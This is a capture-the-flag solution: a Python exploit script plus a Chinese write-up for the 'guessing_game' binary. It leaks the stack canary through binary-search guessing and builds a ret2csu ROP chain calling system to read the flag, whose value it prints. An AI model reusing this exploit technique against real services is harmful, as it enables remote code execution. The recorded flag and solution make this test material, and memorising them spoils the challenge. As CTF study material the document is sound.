#!/usr/bin/env python3
import socket
import ssl
import struct

HOST = "guessing-game.challs.pwnoh.io"
PORT = 1337
MAX_VAL = (1 << 56) - 1

SUCCESS = b"Wow! You got it!"
TOO_HIGH = b"Too high!"
TOO_LOW = b"Too low!"
NAME_PROMPT = b"leaderboard: "

POP_RDI = 0x40124d
GETS_PLT = 0x4010e0
CSU_POP = 0x40149a
CSU_CALL = 0x401480
COMMAND_ADDR = 0x404500
SYSTEM_PTR = 0x404068
RET_EXIT = 0x401417
COMMAND = b"/bin/sh -c 'cat flag.txt || cat flag'"


def p64(value):
    return struct.pack("<Q", value)


def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(1)
        if not chunk:
            raise ConnectionError("Connection closed while waiting for marker")
        data += chunk
    return data


def recv_response(sock):
    data = b""
    matched = None
    while True:
        chunk = sock.recv(1)
        if not chunk:
            raise ConnectionError("Connection closed while reading response")
        data += chunk
        if matched is None:
            if SUCCESS in data:
                matched = SUCCESS
            elif TOO_HIGH in data:
                matched = TOO_HIGH
            elif TOO_LOW in data:
                matched = TOO_LOW
        if matched is not None and data.endswith(b"\n"):
            break
    return data, matched


def build_payload(canary):
    payload = b"A" * 10
    payload += p64(canary)
    payload += p64(0)

    payload += p64(POP_RDI) + p64(COMMAND_ADDR)
    payload += p64(GETS_PLT)

    payload += p64(CSU_POP)
    payload += p64(0)              # rbx
    payload += p64(1)              # rbp
    payload += p64(COMMAND_ADDR)   # r12 -> rdi
    payload += p64(0)              # r13 -> rsi
    payload += p64(0)              # r14 -> rdx
    payload += p64(SYSTEM_PTR)     # r15 -> function pointer

    payload += p64(CSU_CALL)
    payload += p64(0)              # skip slot (add rsp, 8)
    payload += p64(0) * 6          # pop rbx, rbp, r12, r13, r14, r15
    payload += p64(RET_EXIT)
    return payload


def obtain_flag():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    raw_sock = socket.create_connection((HOST, PORT))
    sock = context.wrap_socket(raw_sock, server_hostname=HOST)
    sock.settimeout(5)

    banner = recv_until(sock, b"Enter a max number: ")
    print(banner.decode(errors="ignore"), end="")

    sock.sendall(str(MAX_VAL).encode() + b"\n")

    low, high = 0, MAX_VAL
    target = None
    last_response = b""

    while low <= high:
        prompt = recv_until(sock, b"Enter a guess: ")
        print(prompt.decode(errors="ignore"), end="")
        guess = (low + high) // 2
        sock.sendall(str(guess).encode() + b"\n")
        response, matched = recv_response(sock)
        print(response.decode(errors="ignore"), end="")
        if matched == TOO_HIGH:
            high = guess - 1
        elif matched == TOO_LOW:
            low = guess + 1
        elif matched == SUCCESS:
            target = guess
            last_response = response
            break
        else:
            raise RuntimeError("Unexpected response from server")

    if target is None:
        raise RuntimeError("Failed to determine target value")

    if NAME_PROMPT not in last_response:
        extra = recv_until(sock, NAME_PROMPT)
        print(extra.decode(errors="ignore"), end="")

    canary = (target << 8) & 0xFFFFFFFFFFFFFFFF
    print(f"[+] Recovered canary: 0x{canary:016x}")

    payload = build_payload(canary)
    sock.sendall(payload + b"\n")

    thanks = recv_until(sock, b"!\n")
    print(thanks.decode(errors="ignore"), end="")

    sock.sendall(COMMAND + b"\n")

    output = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            output += chunk
            if b"flag" in output.lower():
                break
    except socket.timeout:
        pass

    print(output.decode(errors="ignore"))
    sock.close()


if __name__ == "__main__":
    obtain_flag()






解题流程
环境侦查
guessing_game 是一个 64 位 ELF，未开 PIE。通过 objdump/strings 可以确认程序逻辑：用户设置最大数值并进行多轮猜数，当猜中后会提示输入名字，gets 读取名字到 0x12 字节的栈缓冲区，存在溢出点。
随机数与栈 canary 泄露
程序读取 max 后，用 scanf 获取第一轮猜测，将该值参与一次 % 运算确定目标数字，同时 canary 被写入 max_guess 缓冲区的高字节，因此通过二分搜索确定正确数值后，可反推出 canary（目标值左移 8 位）。这一步完全通过程序交互完成。
构造 ROP
栈溢出可覆盖 canary 之后的返回地址，因此需要保留泄露出的 canary 并伪造 ROP。程序中有完整的 __libc_csu_init gadget，可借助：
POP_RDI = 0x40124d
GETS_PLT = 0x4010e0
CSU_POP = 0x40149a
CSU_CALL = 0x401480
SYSTEM_PTR = 0x404068 (system@GOT)
COMMAND_ADDR = 0x404500 (.data 可写段)
利用思路
构造栈帧：padding + canary + fake_rbp。
利用 pop rdi; ret 与 gets@plt 向 .data 写入命令 /bin/sh -c 'cat flag.txt || cat flag'。
借助 __libc_csu_init 的通用调用链设置寄存器为 system(COMMAND_ADDR)，直接执行命令。
返回地址设为普通 ret，避免程序崩溃。
自动脚本
脚本位于 solve_guessing_game.py，核心逻辑如下：
solve_guessing_game.pyLines 60-138
payload
def build_payload(canary):    payload = b"A" * 10    payload += p64(canary)    payload += p64(0)    payload += p64(POP_RDI) + p64(COMMAND_ADDR)    payload += p64(GETS_PLT)    payload += p64(CSU_POP)    payload += p64(0)              # rbx    payload += p64(1)              # rbp    payload += p64(COMMAND_ADDR)   # r12 -> rdi    payload += p64(0)              # r13 -> rsi    payload += p64(0)              # r14 -> rdx    payload += p64(SYSTEM_PTR)     # r15 -> function pointer    payload += p64(CSU_CALL)    payload += p64(0)              # skip slot (add rsp, 8)    payload += p64(0) * 6          # pop rbx, rbp, r12, r13, r14, r15    payload += p64(RET_EXIT)    return payload
脚本首先进行二分猜数得到目标值；
用目标值左移 8 位计算 canary；
发送上述 ROP payload；
再发送命令字符串以获取 flag。
运行结果
执行脚本后返回 flag：bctf{wh4t_a_sTrAng3_RNG}。
复现要点
使用脚本或手动交互泄露 canary；
利用 gets 写命令，CSU 链执行 system；
通过命令 cat flag.txt 即可完成。